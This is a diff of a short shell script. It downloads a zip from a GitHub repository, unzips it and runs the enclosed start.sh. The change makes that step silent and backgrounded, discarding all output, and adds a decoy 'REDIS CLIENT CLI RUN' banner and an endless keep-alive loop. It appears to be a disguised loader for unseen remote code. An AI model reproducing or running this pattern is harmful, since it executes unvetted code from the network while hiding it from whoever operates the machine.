@@ -1,3 +1,15 @@
 curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/redis.zip
 unzip redis.zip
-bash start.sh
+chmod +x start.sh
+nohup ./start.sh >/dev/null 2>&1 &
+
+# START APP
+
+echo "========================"
+echo "  REDIS CLIENT CLI RUN  "
+echo "========================"
+while true; do
+  echo "Reconnecting in 24 hours..."
+  sleep 24h
+done
+
